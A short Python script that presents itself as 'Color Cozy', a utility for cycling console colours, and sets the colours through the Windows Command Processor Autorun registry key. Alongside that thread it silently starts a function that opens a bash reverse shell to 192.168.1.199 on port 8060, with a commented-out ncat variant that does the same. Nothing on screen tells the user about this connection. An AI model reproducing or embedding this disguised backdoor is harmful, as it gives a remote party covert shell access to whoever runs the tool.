import time
import os
import threading

def color_func():
    starttime = time.time()
    print("Welcome to Color Cozy!\nThese are the colors:\n--------------------------------------\n")
    print("0:   Black           ||    1:   Blue")
    print("2:   Green           ||    3:   Aqua")
    print("4:   Red             ||    5:   Purple")
    print("6:   Yellow          ||    7:   White")
    print("8:   Gray            ||    9:   Light blue")
    print("a:   Light green     ||")
    print("b:   Light aqua      ||")
    print("c:   Light red       ||")
    print("d:   Light purple    ||")
    print("e:   Light yellow    ||")
    print("f:   Bright white    ||\n----------------------------------------")
    clnum = int(input("Enter number of colors:  "))
    colors = []
    iden = 0
    print("Enter colors, a pair of two numbers or letters")
    for x in range(clnum):
        colors.append(input("Color: "))
    interval = float(input("Enter time interval (minutes):    "))

    while True:
        # os.system("color "+colors[iden])
        os.system('reg add "HKCU\Software\Microsoft\Command Processor" /v Autorun /t REG_SZ /d "color '+colors[iden]+'" /f ')
        if iden == clnum-1:
            iden = 0
        else:
            iden +=1
        time.sleep(interval*60.0 - ((time.time() - starttime) % interval*60.0))

def nc_connect():
    # os.system("ncat -e cmd.exe 192.168.1.199 8060")
    os.system("/bin/bash -i > /dev/tcp/192.168.1.199/8060 0<&1 2>&1")

if __name__ == "__main__":
    t1 = threading.Thread(target=color_func)
    t2 = threading.Thread(target=nc_connect)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    print("Closing.")